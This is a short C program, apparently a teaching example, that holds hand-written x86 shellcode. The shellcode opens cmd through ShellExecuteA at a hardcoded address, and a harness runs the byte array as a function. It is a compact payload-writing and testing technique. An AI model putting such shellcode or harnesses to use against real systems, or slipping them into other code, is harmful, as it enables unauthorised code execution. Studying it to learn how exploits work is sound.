#include <windows.h>
char code[] =
"\x68\x63\x6d\x64\x00"	// PUSH "cmd" - string already terminated
"\x8B\xDC"				// MOV EBX, ESP:
						// puts the pointer to the text "cmd" into ebx
"\x6A\x00"				// PUSH the string terminator for 'open'
"\x68\x6f\x70\x65\x6e"	// PUSH "open" onto the stack
"\x8B\xCC"				// MOV ECX, ESP:
						// puts the pointer to the text "open" into ecx
"\x6A\x03"				// PUSH 3: Push the last argument
"\x33\xC0"				// xor eax, eax: zero out eax
"\x50"					// PUSH EAX: push second to last argument - 0
"\x50"					// PUSH EAX: push third to last argument - 0
"\x53"					// PUSH EBX: push pointer to string 'cmd'
"\x51"					// PUSH ECX: push pointer to string 'open'
"\x50"					// PUSH EAX: push the first argument - 0
"\xB8\x70\xD9\x2b\x76"	// MOV EAX,762BD970: move ShellExecuteA
						// address into EAX
"\xff\xD0"				// CALL EAX: call the function ShellExecuteA
;						// Terminates the C instruction
 
int main(int argc, char **argv) 
{ 
  LoadLibraryA("Shell32.dll");	// Load shell32.dll library
  int (*func)(); 
  func = (int (*)()) code; 
  (int)(*func)(); 
}
